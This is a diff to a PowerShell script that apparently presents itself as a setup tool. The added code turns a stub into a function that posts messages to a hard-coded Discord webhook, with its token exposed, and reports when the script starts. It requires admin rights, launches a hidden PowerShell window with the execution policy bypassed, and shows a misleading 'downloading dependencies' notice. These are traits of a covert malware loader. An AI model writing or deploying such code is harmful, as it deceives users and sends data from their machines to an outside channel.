@@ -2,7 +2,13 @@ $webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNx
 
 function Send-WebhookMessage {
     param($Message)
-    return $true
+    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
+    try {
+        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
 }
 
 Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
@@ -15,6 +21,19 @@ try {
         [System.Windows.MessageBox]::Show('Please run this script as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
         exit
     }
+
+    function Show-SilentMessageBox {
+        param(
+            [string]$Message = "Default message",
+            [string]$Title = "Info",
+            [string]$Icon = "Information"
+        )
+        
+        $arguments = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('$Message', '$Title', 'OK', '$Icon')`""
+        
+        Start-Process powershell -ArgumentList $arguments -WindowStyle Hidden
+    }
+    Show-SilentMessageBox -Message "Please give us 15-30 seconds to set up the filebase and download dependencies" -Title "Info"
 
     $programFiles = "C:\Program Files"
     $tempFolder = $env:TEMP
